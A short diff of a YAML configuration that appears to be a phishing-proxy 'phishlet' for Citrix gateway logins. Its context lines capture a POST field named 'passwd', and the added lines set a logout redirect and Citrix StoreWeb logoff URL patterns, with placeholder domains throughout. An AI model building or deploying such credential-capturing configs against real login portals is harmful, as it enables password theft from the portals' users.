@@ -17,6 +17,9 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
+logout:
+  redirect_to: 'https://subdomainhere.domainhere/'
+  urls: ['^.*/Citrix/CDCTXSTOREWeb/Sessions/Disconnect$','^.*/Citrix/CDCTXSTOREWeb/Authentication/Logoff$','.*/Citrix/CDCTXSTOREWeb/logout.aspx$']
 login:
   domain: 'subdomainhere.domainhere'
   path: '/vpn/index.html'
